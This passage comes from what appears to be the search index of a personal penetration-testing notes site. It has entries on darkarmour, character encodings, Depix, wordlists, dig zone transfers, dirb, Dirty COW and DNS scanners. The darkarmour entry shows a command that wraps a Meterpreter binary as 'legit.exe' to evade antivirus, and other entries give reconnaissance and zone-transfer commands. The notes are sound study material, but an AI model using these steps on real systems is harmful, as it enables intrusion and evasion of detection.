calculator</p>","tags":["cvss"]},{"location":"darkarmour/","title":"darkarmour","text":"<p>Store and execute an encrypted windows binary from inside memory, without a single bit touching disk: generate an undetectable version of a pe executable.</p>","tags":["payloads","tools"]},{"location":"darkarmour/#installation","title":"Installation","text":"<p>Download from github repo: https://github.com/bats3c/darkarmour.</p> <p>It uses the python stdlib so no need to worry about any python dependencies, so the only issue you could come accoss are binary dependencies. The required binarys are: i686-w64-mingw32-g++, i686-w64-mingw32-gcc and upx (probly osslsigncode soon as well). These can all be installed via apt.</p> <pre><code>sudo apt install mingw-w64-tools mingw-w64-common g++-mingw-w64 gcc-mingw-w64 upx-ucl osslsigncode\n</code></pre>","tags":["payloads","tools"]},{"location":"darkarmour/#basic-usage","title":"Basic usage","text":"<pre><code>./darkarmour.py -f bins/meter.exe --encrypt xor --jmp -o bins/legit.exe --loop 5\n\n\n# -f: file to crypt, assumed as binary if not told otherwise\n# -e: encryption algorithm to use (xor)\n# -S: SHELLCODE file contating the shellcode, needs to be in the 'msfvenom -f raw' style format \n# -b: provide if file is a binary exe\n# -d, --dll: use reflective dll injection to execute the binary inside another process\n# -s: provide if the file is c source code\n# -k: key to encrypt with, randomly generated if not supplied\n# -l LOOP, --loop: LOOP  number of levels of encryption\n# -o: name of outfile, if not provided then random filenameis assigned\n</code></pre>","tags":["payloads","tools"]},{"location":"data-encoding/","title":"Data encoding","text":"Resources <ul> <li>All ASCII codes</li> <li>All UTF-8 enconding table and Unicode characters</li> <li>Charset converter</li> <li>HTML\u00a0URL Encoding\u00a0Reference</li> </ul> <p>Encoding ensures that data like text, images, files and multimedia can be effectively communicated and displayed through web technologies and typically involves converting data from its original form into a format that is suitable for digital transmission and storage while preserving its meaning and integrity. Encoding plays a crucial role in discovering and understanding how a web application handles different types of input, especially when those inputs contain special characters, binary data, or unexpected sequences.</p> <p>Encoding is an essential aspect of web application penetration testing, particularly when dealing with input validation, data  transmission, and various attack vectors. It involves  manipulating data or converting it into a different format, often to bypass security measures, discover vulnerabilities, or execute attacks.</p>"},{"location":"data-encoding/#basic-concepts","title":"Basic concepts","text":"<p>A \"charset,\" short for character set, is a collection of characters, symbols, and glyphs that are associated with unique numeric codes or code points. Character sets define how textual data is mapped to binary values in computing systems. Examples of charsets are: ASCII, Unicode, Latin-1 etc.</p> <p>Character encoding is the representation in bytes of the symbols of a charset.</p>"},{"location":"data-encoding/#ascii-encoding","title":"ASCII encoding","text":"<p>URLs are permitted to contain only the printable characters in the US-ASCII character set: those in the range 0x20-0x7e inclusive. The URL-encoded form of any character is the % prefix followed by the character's two digit ASCII code expresed in hexadecimal.</p> <p>ASCII stands for \"American Standard Code for Information Interchange.\" It's a widely used character encoding standard containing 128 characters that was developed in the 1960s to represent text and control characters in computers and communication equipment. ASCII defines a set of codes to represent letters, numbers, punctuation, and control characters used in the English language and basic communication. It primarily covers English characters, numbers, punctuation, and control characters, using 7 or 8 bits to represent each character. ASCII cannot be used to display symbols from other languages like Chinese.</p> <p>All ASCII codes</p> %3d = %25 % %20 space %00 null byte %0a new line %27 ' %22 \" %2e . %2f / %28 ( %29 ) %5e ^ %3f ? %3c &lt; %3e &gt; %3b ; %23 # %2d - %2a * %3a : %5c| \\ %5b [ %5d ] <p>Characteristics:</p> <ul> <li>Character Set: ASCII includes a total of 128 characters, each represented by a unique 7-bit binary code. These characters include uppercase and lowercase letters, digits, punctuation marks, and some control characters.</li> <li>7-Bit Encoding: In ASCII, each character is encoded using 7 bits, allowing for a total of 2^7 (128) possible characters. The most significant bit is often used for parity checking in older systems.</li> <li>Standardization: ASCII was established as a standard by the American National Standards Institute (ANSI) in 1963 and later became an international standard.</li> <li> <p>Basic Character Set: </p> <ul> <li>Uppercase letters: A-Z (65-90)</li> <li>Lowercase letters: a-z (97-122)</li> <li>Digits: 0-9 (48-57)</li> <li>Punctuation: Various symbols such as !, @, #, $, %, etc.</li> <li>Control characters: Characters like newline, tab, carriage return, etc.</li> </ul> </li> <li> <p>Compatibility: ASCII is a subset of many other character encodings, including more comprehensive standards like Unicode. The first 128 characters of the Unicode standard correspond to the ASCII characters. </p> </li> <li>Limitations: ASCII is primarily designed for English text and doesn't support characters from other languages or special symbols.</li> </ul>"},{"location":"data-encoding/#unicode-encoding","title":"Unicode encoding","text":"<p>Unicode is a character set standard that aims to encompass characters from all writing systems and languages used worldwide. Unlike early encoding standards like ASCII, which were limited to a small set of characters, Unicode provides a unified system for representing a vast range of characters, symbols, and glyphs in a consistent manner. It enables computers to handle text and characters from diverse languages and scripts, making it essential for  internationalization and multilingual communication. </p> <p>\"UTF\" stands for \"Unicode Transformation Format.\" It refers to different character encoding schemes within the Unicode standard that are used to represent Unicode characters as binary data.  Unicode has three main character encoding schemes: UTF-8, UTF-16 and UTF-32. The trailing number indicates the number of bits to represent code points.</p> <p></p> <p></p> <p>All UTF-8 enconding table and Unicode characters</p>"},{"location":"data-encoding/#utf-8-unicode-transformation-format-8-bit","title":"UTF-8 (Unicode Transformation Format 8-bit)","text":"<p>UTF-8 is a variable-length character encoding scheme. It uses 8-bit units (bytes) to represent characters. ASCII characters are represented using a single byte (backward compatibility).</p> <p>Non-ASCII characters are represented using multiple bytes, with the number of bytes varying based on the character's code point. </p> <p>UTF-8 is widely used on the web and in many applications due to its efficiency and compatibility with ASCII.</p>"},{"location":"data-encoding/#utf-16-unicode-transformation-format-16-bit","title":"UTF-16 (Unicode Transformation Format 16-bit)","text":"<p>UTF-16 is a variable-length character encoding scheme. It uses 16-bit units (two bytes) to represent characters. Characters with code points below 65536 (BMP - Basic Multilingual Plane) are represented using two bytes. </p> <p>Characters with higher code points (outside the BMP) are represented using four bytes (surrogate pairs).</p> <p>UTF-16 is commonly used in programming languages like Java and Windows systems.</p>"},{"location":"data-encoding/#html-encoding","title":"HTML encoding","text":"<p>HTML encoding, also known as HTML entity encoding, involves converting special characters and reserved symbols into their corresponding HTML entities to ensure that they are displayed correctly in web browsers and avoid any unintended  interpretation as HTML code.</p> <p>HTML encoding is crucial for maintaining the integrity of web content and preventing issues such as cross-site scripting (XSS) attacks. HTML entities are sequences of characters that represent special characters, symbols, and reserved characters in HTML.</p> <p>They start with an ampersand (&amp;) and end with a semicolon (;). When the browser encounters an entity in an HTML page it will show the symbol to the user and will not interpret the symbol as an HTML language element.</p> <code>&amp;lt;</code> &lt; (less than sign) <code>&amp;gt;</code> &gt; (greater than sign) <code>&amp;amp;</code> &amp; (ampersand) <code>&amp;quot;</code> \" (double quotation mark) <code>&amp;apos;</code> ' (apostrophe) <code>&amp;nbsp;</code> non-breaking space <code>&amp;mdash;</code> em dash (\u2014) <code>&amp;copy;</code> copyright symbol (\u00a9) <code>&amp;reg;</code> registered trademark symbol (\u00ae) <code>&amp;hellip;</code> ellipsis (...) <p>In addition, any character can be HTML encoded using its ASCII code in decimal form:</p> <code>&amp;#34;</code> \" <code>&amp;#39;</code> ' <p>or by using its ASCII code in hexadecimal form (prefixed by an X): </p> <code>&amp;#x22;</code> \" <code>&amp;#x27;</code> '"},{"location":"data-encoding/#url-encoding","title":"URL Encoding","text":"<p>HTML\u00a0URL Encoding\u00a0Reference</p> <p>URL encoding, also known as percent-encoding, is a process used to encode special characters, reserved characters, and non-ASCII characters into a format that is safe for transmission within URLs (Uniform Resource Locators) and URI (Uniform Resource Identifiers). </p> <p>URL encoding replaces unsafe characters with a \"%\" sign  followed by two hexadecimal digits that represent the ASCII  code of the character.  This allows URLs to be properly interpreted by web browsers and other network components. URLs sent over the Internet must contain characters in the range of the US-ASCII code character set. If unsafe characters are present in a URL, encoding them is required. </p> <p>This encoding is important because it limits the characters to be used in a URL to a subset of specific characters: </p> <ul> <li>Unreserved Chars- <code>[a-zA-z] [0-9] [- . _ ~]</code> </li> <li>Reserved Chars <code>- : / ? # [ ] @ ! $ &amp; \" ( ) * + , ; = %</code></li> </ul> <p>Other characters are encoded by the use of a percent char (%) plus two hexadecimal digits. Although it appears to be a security feature, URL-encoding is not. It is only a method used to send data across the Internet but, it can lower (or enlarge) the attack surface (in some cases).</p> <p>Generally, web browsers (and other client-side components) automatically perform URL-encoding and, if a server-side script engine is present, it will automatically perform URL-decoding.</p> <p></p> <p></p> %23 # %3F ? %24 &amp; %25 % %2F / %2B + <code>&lt;space&gt;</code> %20 or + <p>URL encoding is defined in the meta tag content type:</p> <pre><code># before HTML5\n&lt;meta http-equiv=\"Content-Type\"Content=\"text/html\";charset=\"utf-8\"&gt;\n\n# With HTML5\n&lt;meta charset=\"utf-8\"&gt;\n</code></pre> <p>This is how you define that HTML meta tag in some languages:</p> <pre><code># PHP\nheader('Content-type: text/html; charset=utf8');\n\n# ASP.NET\n&lt;%Response.charset=\"utf-8\"%&gt;\n\n# JSP\n&lt;%@ page contentType=\"text/html; charset=UTF-8\" %&gt;\n</code></pre>"},{"location":"data-encoding/#base64-encoding","title":"Base64 encoding","text":"<p>Base64 is an schema that allows any binary data (images, audio files, and other non-text data) to be safely represented by using solely printable ASCII characters. </p> <p>Base64 is commonly used for encoding email attachtment for safe transmission over SMTP. It's also used for encoding user credentials in basic HTTP authentication. </p>"},{"location":"data-encoding/#how-it-works","title":"How it works","text":"<p>Encoding</p> <p>Base64 encoding processes input data in blocks of 3 bytes. It divides these 24  bits into 4 chunks of six bits each. With these 64 different possible permutations (for the six bits) it can represent the following character set:</p> <pre><code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\n</code></pre> <p></p> <p>Different variations of Base64 encoding may use different characters for the last two positions (<code>+</code> and <code>/</code>).</p> <p>If the final block of input data results in less than 3 chunks of output data, the the output is padded with one or two equal signs characters.</p> <p></p> <p></p> <p></p> <p>Decoding</p> <p>Base64 decoding is the reverse process. The encoded Base64 string is divided into segments of four characters. Each character is converted back to its 6-bit value, and these values are combined to reconstruct the original binary data.</p> <p>Use cases</p> <ul> <li>Binary Data in Text Contexts: Web applications often deal with binary data such as images, audio, or files. Since URLs, HTML, and other text-based formats can't directly handle binary data, Base64 encoding is used to represent this binary data as text. This allows binary data to be included in places that expect text, such as in HTML or JSON responses.</li> <li>Data URL Embedding: Data URLs are a way to embed small resources directly into the HTML or CSS code. These URLs include the actual resource data in Base64-encoded form, eliminating the need for separate HTTP requests. For example, an image can be embedded directly in the HTML using a Data URL.</li> <li>Minimization of Requests: By encoding small images or icons as Data URLs within CSS or HTML, web developers can reduce the number of requests made to the server, potentially improving page load times. </li> <li>Simplification of Resource Management: Embedding resources directly into HTML or CSS can simplify resource management and deployment. Developers don't need to worry about file paths or URLs. </li> <li>Offline Storage: In certain offline or single-page applications, Base64-encoded data can be stored in local storage or indexedDB for quick access without the need to fetch resources from the server.</li> </ul> <p>Encoding/decoding in Base64:</p> <pre><code># PHP Example\nbase64_encode('encode this string');\nbase64_decode('ZW5jb2RlIHRoaXMgc3RyaW5n');\n\n# Javascript example\nwindow.btoa('encode this string');\nwindow.atob('ZW5jb2RlIHRoaXMgc3RyaW5n');\n\n# Handling Unicode in javascript requires previous encoding. The escapes and encodings are required to avoid exceptions with characters out of range\nwindow.btoa(encodeURIComponent(escape ('encode this string') ));\nwindow.atob(decodeURIComponent(escape ('ZW5jb2RlIHRoaXMgc3RyaW5n') ));\n</code></pre>"},{"location":"data-encoding/#base-36-encoding-scheme","title":"Base 36 encoding scheme","text":"<p>It's the most compact, case-insensitive, alphanumeric numeral system using ASCII characters. The scheme's alphabet contains all digits <code>[0-9]</code> and Latin letters <code>[A-Z]</code>.</p> <p></p> Base 10 Base 36 1294870408610 GIUSEPPE <p>Base 36 Encoding scheme is used in many real-world scenarios.</p> <p>Converting Base36 to decimal:</p> <pre><code># Number Base36 OHPE to decimal base\n\n# PHP Example: base_convert()\nbase_convert(\"OHPE\",36,10);\n\n# Javascript example: toString\n(1142690).toString(36)\nparseInt(\"ohpe\",36)\n</code></pre>"},{"location":"data-encoding/#visual-spoofing-attack","title":"Visual spoofing attack","text":"<p>It's one of the possible attacks that can be perform with unicode:</p> <p></p> <p></p> <p>A tool for generating visual spoofing attacks: https://www.irongeek.com/homoglyph-attack-generator.php</p> <p></p> <p>Paper</p>"},{"location":"data-encoding/#multiple-encodingsdecodings","title":"Multiple encodings/decodings","text":"<p>Sometimes encoding and decoding is used multiple times. This can also be used to bypass security measures.</p>"},{"location":"depix/","title":"Depix - A tool for extracting data from pixeled images","text":"","tags":["reconnaissance","scanner"]},{"location":"depix/#installation","title":"Installation","text":"<pre><code>git clone https://github.com/spipm/Depix.git\ncd Depix\n</code></pre>","tags":["reconnaissance","scanner"]},{"location":"depix/#basic-usage","title":"Basic usage","text":"<pre><code>python3 depix.py \\\n    -p images/testimages/sublime_screenshot_pixels_gimp.png \\\n    -s images/searchimages/debruin_sublime_Linux_small.png \\\n    --backgroundcolor 40,41,35 \\\n    --averagetype linear\n</code></pre>","tags":["reconnaissance","scanner"]},{"location":"dictionaries/","title":"Dictionaries","text":"","tags":["web pentesting","dictionary","tools"]},{"location":"dictionaries/#lists-of-my-most-used-dictionaries","title":"Lists of my most used dictionaries","text":"Dictionary Link Description Intended for Dotdotpwn https://github.com/wireghoul/dotdotpwn It's a very flexible intelligent fuzzer to discover traversal directory vulnerabilities in software such as HTTP/FTP/TFTP servers, Web platforms such as CMSs, ERPs, Blogs, etc. Traversal directory Payload all the things https://github.com/swisskyrepo/PayloadsAllTheThings many different resources and cheat sheets for payload generation and general methodology. Rockyou /usr/shared/wordlists/rockyou.txt.gz RockYou was a company that developed widgets for MySpace and implemented applications for various social networks and Facebook. Since 2014, it has engaged primarily in the purchases of rights to classic video games; it incorporates in-game ads and re-distributes the games. User agents Seclist Intended to bypass rate limiting (in an API) User-agent headers Windows Files My dictionaty repo To read interesting files from windows machines Intended for information disclosure Default Credential Cheat sheets https://github.com/ihebski/DefaultCreds-cheat-sheet Install and run <code>\"python3.11 creds search &lt;service&gt;\"</code> Insidetruest Statistically Likelly Usernames This resource contains wordlists for creating statistically likely usernames for use in username-enumeration, simulated password-attacks and other security testing tasks.","tags":["web pentesting","dictionary","tools"]},{"location":"dictionaries/#installing-wordlists-in-your-kali","title":"Installing wordlists in your kali","text":"<pre><code># This package contains the rockyou.txt wordlist and has an installation size of 134 MB.\nsudo apt install wordlists\n</code></pre> <p>You will be adding:</p> <pre><code>/usr/share/wordlists\n|-- amass -&gt; /usr/share/amass/wordlists\n|-- brutespray -&gt; /usr/share/brutespray/wordlist\n|-- dirb -&gt; /usr/share/dirb/wordlists\n|-- dirbuster -&gt; /usr/share/dirbuster/wordlists\n|-- dnsmap.txt -&gt; /usr/share/dnsmap/wordlist_TLAs.txt\n|-- fasttrack.txt -&gt; /usr/share/set/src/fasttrack/wordlist.txt\n|-- fern-wifi -&gt; /usr/share/fern-wifi-cracker/extras/wordlists\n|-- john.lst -&gt; /usr/share/john/password.lst\n|-- legion -&gt; /usr/share/legion/wordlists\n|-- metasploit -&gt; /usr/share/metasploit-framework/data/wordlists\n|-- nmap.lst -&gt; /usr/share/nmap/nselib/data/passwords.lst\n|-- rockyou.txt.gz\n|-- seclists -&gt; /usr/share/seclists\n|-- sqlmap.txt -&gt; /usr/share/sqlmap/data/txt/wordlist.txt\n|-- wfuzz -&gt; /usr/share/wfuzz/wordlist\n`-- wifite.txt -&gt; /usr/share/dict/wordlist-probable.txt\n</code></pre>","tags":["web pentesting","dictionary","tools"]},{"location":"dictionaries/#installing-seclist","title":"Installing seclist","text":"<pre><code>git clone https://github.com/danielmiessler/SecLists\n\nsudo apt install seclists -y\n</code></pre>","tags":["web pentesting","dictionary","tools"]},{"location":"dictionaries/#dictionary-generators","title":"Dictionary generators","text":"<ul> <li>crunch.</li> <li>cewl.</li> <li>Common User Password Profiler: CUPP.</li> <li>Username Anarchy.</li> </ul>","tags":["web pentesting","dictionary","tools"]},{"location":"dictionaries/#more-dictionaries","title":"More dictionaries","text":"<ul> <li>Dictionaries for cracking passwords: https://wiki.skullsecurity.org/index.php/Passwords.</li> <li>[Wordlist from wfuzz](https://github.com/xmendez/wfuzz/tree/master/wordlist.</li> </ul>","tags":["web pentesting","dictionary","tools"]},{"location":"dictionaries/#default-credentials","title":"Default credentials","text":"<p>Install app \"Cred\" from: https://github.com/ihebski/DefaultCreds-cheat-sheet</p> <pre><code>pip3 install defaultcreds-cheat-sheet\n\npython3.11 creds search tomcat\n</code></pre>","tags":["web pentesting","dictionary","tools"]},{"location":"dig/","title":"dig","text":"<p>The\u00a0<code>dig</code>\u00a0command (<code>Domain Information Groper</code>) is a versatile and powerful utility for querying DNS servers and retrieving various types of DNS records. Its flexibility and detailed and customizable output make it a go-to choice. </p> Resources <ul> <li>References:  https://linux.die.net/man/1/dig</li> <li>See also # Port 53 - Domain Name Server (DNS).</li> </ul>","tags":["pentesting","dns","enumeration","tools"]},{"location":"dig/#footprinting-dns-with-dig","title":"Footprinting DNS with dig","text":"<pre><code># Querying: A Records for a Subdomain. Retrieves the IPv4 address (A record) associated with the domain. \ndig A www.example @$ip\n # here, $ip refers to ip of DNS server\n\n# Retrieves the IPv6 address (AAAA record) associated with the domain.\ndig AAAA www.example @$ip\n\n# Retrieves the start of authority (SOA) record for the domain. Get email of administrator of the domain\ndig SOA www.example.com\n# The email will contain a (.) dot notation instead of @\n\n# ENUMERATION\n# List nameservers known for that domain. Identifies the authoritative name servers for the domain.\ndig NS example.com @$ip\n# -ns: other name servers are known in NS record\n#  `@` character specifies the DNS server we want to query.\n# here, $ip refers to ip of DNS server\n\n# View all available records\ndig ANY example.com @$ip\n # here, $ip refers to ip of DNS server. The more recent RFC8482 specified that `ANY` DNS requests be abolished. Therefore, we may not receive a response to our `ANY` request from the DNS server.\n\n# Display version. query a DNS server's version using a class CHAOS query and type TXT. However, this entry must exist on the DNS server.\ndig CH TXT version.bind $ip\n\n\n\n# Querying: TXT Records. Retrieves any TXT records associated with the domain.\ndig txt example.com @$ip\n\n# Querying: MX Records. Finds the mail servers (MX records) responsible for the domain.\ndig MX example.com @1.1.1.1\n\n# Specifies a specific name server to query; in this case 1.1.1.1\ndig @1.1.1.1 domain.com\n\n# Querying: PTR Records for an IP Address\ndig -x $ip @1.1.1.1\n\n# Performs a reverse lookup on the IP address 192.168.1.1 to find the associated host name. You may need to specify a name server. You can also facilitate a range:\ndig -x 192.168 @1.1.1.1\n\n# Shows the full path of DNS resolution.\ndig +trace domain.com\n\n# Provides a short, concise answer to the query.\ndig +short domain.com\n\n# Displays only the answer section of the query output.\ndig +noall +answer domain.com\n</code></pre>","tags":["pentesting","dns","enumeration","tools"]},{"location":"dig/#interpretation-of-the-output","title":"Interpretation of the output","text":"<p>The output can be broken down into four key sections:</p> <ul> <li>Header</li> <li>Question Section</li> <li>Answer Section</li> <li>Footer</li> </ul> <p>An\u00a0<code>opt pseudosection</code>\u00a0can sometimes exist in a\u00a0<code>dig</code>\u00a0query. This is due to Extension Mechanisms for DNS (<code>EDNS</code>), which allows for additional features such as larger message sizes and DNS Security Extensions (<code>DNSSEC</code>) support.</p> <pre><code>######\n# 1. Header\n######\n\n;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 16449`: \n# This line indicates the type of query (`QUERY`), the successful status (`NOERROR`), and a unique identifier (`16449`) for this specific query.\n\n;; flags: qr rd ad; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0`:\n# This describes the flags in the DNS header:\n# - `qr`: Query Response flag - indicates this is a response.\n# - `rd`: Recursion Desired flag - means recursion was requested.\n# - `ad`: Authentic Data flag - means the resolver considers the data authentic.\n# The remaining numbers indicate the number of entries in each section of the DNS response: 1 question, 1 answer, 0 authority records, and 0 additional records.\n\n;; WARNING: recursion requested but not available\n# This indicates that recursion was requested, but the server does not support it.\n\n######\n# 2. Question Section\n######\n\n;google.com. IN A\n# This line specifies the question: \"What is the IPv4 address (A record) for\u00a0`google.com`?\"\n\n######\n# 3. Answer Section\n######\n\ngoogle.com. 0 IN A 142.251.47.142\n# This is the answer to the query. It indicates that the IP address associated with\u00a0`google.com`\u00a0is\u00a0`142.251.47.142`. The '`0`' represents the\u00a0`TTL`\u00a0(time-to-live), indicating how long the result can be cached before being refreshed.\n\n######\n# 4. Footer\n######\n\n;; Query time: 0 msec`\n# This shows the time it took for the query to be processed and the response to be received (0 milliseconds).\n\n;; SERVER: 172.23.176.1#53(172.23.176.1) (UDP)\n# This identifies the DNS server that provided the answer and the protocol used (UDP).\n\n;; WHEN: Thu Jun 13 10:45:58 SAST 2024\n# This is the timestamp of when the query was made.\n\n;; MSG SIZE rcvd: 54\n# This indicates the size of the DNS message received (54 bytes).\n</code></pre>","tags":["pentesting","dns","enumeration","tools"]},{"location":"dig/#dig-axfr","title":"dig axfr","text":"<p>dig is a DNS lookup utility but combined with \"axfr\" is used to do DNS zone transfer. This procedure is abbreviated <code>Asynchronous Full Transfer Zone</code> (<code>AXFR</code>), which is the protocol used during a DNS zone transfer. </p> <p>Basically, in a DNS query a client provide a human-readable hostname and the DNS server responses with an IP address. </p> <p>Quick syntax for zone transfers:</p> <pre><code># This command instructs\u00a0`dig`\u00a0to request a full zone transfer (`axfr`) from the DNS server responsible for\u00a0`actualtarget.com`. If the server is misconfigured and allows the transfer, you'll receive a complete list of DNS records for the domain, including all subdomains.\ndig axfr actualtarget.com @nameserver \n\n# You can also solicitate the transfer of reverse DNS query\n dig axfr -x 192.168  @ip\n</code></pre>","tags":["pentesting","dns","enumeration","tools"]},{"location":"dig/#what-is-a-dns-zone","title":"What is a DNS zone?","text":"<p>DNS servers host zones. One example of a DNS zone might be example.com and all its subdomains. However secondzone.example.com can also be a separated zone. </p> <p>A zone file is a text file that describes a DNS zone with the BIND file format. In other words it is a point of delegation in the DNS tree. The BIND file format is the industry-preferred zone file format and is now well established in DNS server software. A zone file describes a zone completely. </p>","tags":["pentesting","dns","enumeration","tools"]},{"location":"dig/#why-is-dns-zone-transfer-needed","title":"Why Is DNS Zone Transfer Needed","text":"<p>Attack vector</p> <p>Unless a DNS server is configured correctly (limiting which IPs can perform a DNS zone transfer), anyone can ask a DNS server for a copy of its zone information since DNS zone transfers do not require any authentication. In addition, the DNS service usually runs on a UDP port; however, when performing DNS zone transfer, it uses a TCP port for reliable data transmission.</p> <p>DNS is a critical service. If a DNS server for a zone is not working and cached information has expired, the domain is inaccessible to all services (web, mail, and more). Therefore, each zone should have at least two DNS servers. For more critical zones, there may be even more.</p> <p>However, a zone may be large and may require frequent changes. If you manually edit zone data on each server separately, it takes a lot of time and there is a a lot of potential for a mistake. This is why DNS zone transfer is needed.</p> <p>You can use different mechanisms for DNS zone transfer but the simplest one is AXFR (technically speaking, AXFR refers to the protocol used during a DNS zone transfer). It is a client-initiated request. Therefore, you can edit information on the primary DNS server and then use AXFR from the secondary DNS server to download the entire zone.  </p> <p>Synchronization between the servers involved is realized by zone transfer. Using a secret key <code>rndc-key</code>, which we have seen initially in the default configuration, the servers make sure that they communicate with their own master or slave. A DNS server that serves as a direct source for synchronizing a zone file is called a master. A DNS server that obtains zone data from a master is called a slave. A primary is always a master, while a secondary can be both a slave and a master. For some <code>Top-Level Domains</code> (<code>TLDs</code>), making zone files for the <code>Second Level Domains</code> accessible on at least two servers is mandatory.</p> <p>Initiating an AXFR zone-transfer request from a secondary server is as simple as using the following dig commands, where zonetransfer.me is the domain that we want to initiate a zone transfer for. First, we will need to get the list of DNS servers for the domain.</p> <pre><code>dig axfr example.htb @$ip\n</code></pre> <p>If the administrator used a subnet for the <code>allow-transfer</code> option for testing purposes or as a workaround solution or set it to <code>any</code>, everyone would query the entire zone file at the DNS server.</p> <p>If misconfigured and left unsecured, this functionality can be abused by attackers to copy the zone file from the primary DNS server to another DNS server. A DNS Zone transfer can provide penetration testers with a holistic view of an organization's network layout. Furthermore, in certain cases, internal network addresses may be found on an organization's DNS servers. </p>","tags":["pentesting","dns","enumeration","tools"]},{"location":"dig/#htb-machines","title":"HTB machines","text":"<p>Some HackTheBox machines exploits DNS zone transfer:</p> <p>In the example of Friendzone machine, accessible web page on port 80 provides an email in which a different domain is appreciated. Also port 53 is open, which is an indicator of some possible DNS zone transfer.</p> <p>In friendzone, we will transfer our zone to all zones spotted in different scanners:</p> <pre><code># friendzone.red was spotted in the nmap scan. Transferring 10.129.228.87 zone to friendzone.red\ndig axfr friendzone.red @10.129.228.87\n\n# Also friendzoneportal.red was spotted in the email that appeared on http://10.129.228.87. Transferring 10.129.228.87 zone to friendzoneportal.red:\ndig axfr friendzoneportal.red @10.129.228.87\n</code></pre>","tags":["pentesting","dns","enumeration","tools"]},{"location":"dirb/","title":"dirb - A web content enumeration tool","text":"<p>DIRB is a web content fingerprinting tool. It scans the server for directories using a dictionary file.</p> <p>Scan the web server (http://192.168.1.224/) for directories using a dictionary file (/usr/share/wordlists/dirb/common.txt):</p>","tags":["pentesting","directory enumeration","tool","vulnerability"]},{"location":"dirb/#dictionaries","title":"Dictionaries","text":"<p>See dictionaries in this repo.</p> <p>Path to default dictionary: /usr/share/dirb/wordlists/</p>","tags":["pentesting","directory enumeration","tool","vulnerability"]},{"location":"dirb/#basic-commands","title":"Basic commands","text":"<pre><code>dirb &lt;HOST&gt;  /path/to/dictionary.txt -o results.txt\n# No flag needed to specify path to dictionary.\n# -o: to print results to a file.\n# -a: agent application. In case that the app checks out this header (use it with https://useragentstring.com/pages/useragentstring.php)\n# -p: for indicating a proxy (for instance, Burp: dirb &lt;target host or IP&gt; -p http://127.0.0.1:8080)\n# -c: it adds a cookie (dirb &lt;target host or IP&gt; -c \u201cMYCOOKIE: ashdkjashdjkas\u201d)\n# -H: it adds a customized header (dirb &lt;target host or IP&gt; -H \u201cMYHEADER: Mycontent\u201d)\n# -r: don\u2019t search recursively in directories\n# -z: it adds a millisecond delay to not cause excessive Flood.\n# -S: silent mode. It doesn\u2019t show tested words.\n# -X: It allows us to specify extensions (dirb &lt;target host or IP&gt; -X \u201c.php, .bak\u201d). Appends each word with this extension\n# -x:  It allows us to use a file with extensions (dirb &lt;target host or IP&gt; -x extensionfile.txt). Appends each word with the extensions specified in the file\n# -o: to save the results in an output file\n</code></pre>","tags":["pentesting","directory enumeration","tool","vulnerability"]},{"location":"dirty-cow/","title":"Dirty COW (Copy On Write)","text":"<p>A race condition was found in the way the Linux kernel's memory subsystem handled the copy-on-write (COW) breakage of private read-only memory mappings. All the information we have so far is included in this page.</p> <p>An unprivileged local user could use this flaw to gain write access to otherwise read-only memory mappings and thus increase their privileges on the system.</p> <p>This flaw allows an attacker with a local system account to modify on-disk binaries, bypassing the standard permission mechanisms that would prevent modification without an appropriate permission set.</p>","tags":["pentesting","linux","privileges escalation"]},{"location":"dirty-cow/#exploitation","title":"Exploitation","text":"<p>List of PoCs: https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs.</p>","tags":["pentesting","linux","privileges escalation"]},{"location":"dirty-cow/#resources","title":"Resources","text":"<ul> <li>https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails.</li> </ul>","tags":["pentesting","linux","privileges escalation"]},{"location":"django-pentesting/","title":"django pentesting","text":"<p>The following Github repository describes OWASP Top10 for Django: https://github.com/boomcamp/django-security</p>","tags":["python","django","pentesting","web pentesting"]},{"location":"dnscan/","title":"dnscan - A DNS subdomain scanner","text":"<p>dnscan is a python wordlist-based DNS subdomain scanner.</p> <p>The script will first try to perform a zone transfer using each of the target domain's nameservers.</p> <p>If this fails, it will lookup TXT and MX records for the domain, and then perform a recursive subdomain scan using the supplied wordlist.</p>","tags":["scanning","domain","subdomain","reconnaissance","pentesting"]},{"location":"dnscan/#installation","title":"Installation","text":"<p>Requirements: dnscan requires Python 3, and the netaddr (version 0.7.19 or greater) and dnspython (version 2.0.0 or greater) libraries.</p> <pre><code>git clone https://github.com/rbsec/dnscan\ncd dnscan\npip install -r requirements.txt\n</code></pre>","tags":["scanning","domain","subdomain","reconnaissance","pentesting"]},{"location":"dnscan/#usage","title":"Usage","text":"<pre><code>dnscan.py (-d \\&lt;domain\\&gt; | -l \\&lt;list\\&gt;) [OPTIONS]\n# Mandatory Arguments\n#    -d  --domain                              Target domain; OR\n#    -l  --list                                Newline separated file of domains to scan\n</code></pre>","tags":["scanning","domain","subdomain","reconnaissance","pentesting"]},{"location":"dnscan/#optional-arguments","title":"Optional Arguments","text":"<pre><code>-w --wordlist &lt;wordlist&gt;                  Wordlist of subdomains to use\n-t --threads &lt;threadcount&gt;                Threads (1 - 32), default 8\n-6 --ipv6                                 Scan for IPv6 records (AAAA)\n-z --zonetransfer                         Perform zone transfer and exit\n-r --recursive                            Recursively scan subdomains\n   --recurse-wildcards                    Recursively scan wildcards (slow)\n\n-m --maxdepth                             Maximum levels to scan recursively\n-a --alterations                          Scan for alterations of subdomains (slow)\n-R --resolver &lt;resolver&gt;                  Use the specified resolver instead of the system default\n-L --resolver-list &lt;file&gt;                 Read list of resolvers from a file\n-T --tld                                  Scan for the domain in all TLDs\n-o --output &lt;filename&gt;                    Output to a text file\n-i --output-ips &lt;filename&gt;                Output discovered IP addresses to a text file\n-n --nocheck                              Don't check nameservers before scanning. Useful in airgapped networks\n-q --quick                                Only perform the zone transfer and subdomain scans. Suppresses most file output with -o\n-N --no-ip                                Don't print IP addresses in the output\n-v --verbose                              Verbose output\n-h --help                                 Display help text\n</code></pre> <p>Custom insertion points can be specified by adding <code>%%</code> in the domain name, such as:</p> <pre><code>dnscan.py -d dev-%%.example.org\n</code></pre>","tags":["scanning","domain","subdomain","reconnaissance","pentesting"]},{"location":"dnsenum/","title":"dnsenum - A tool to enumerate DNS","text":"<p>multithreaded perl script to enumerate DNS information of a domain and to discover non-contiguous ip 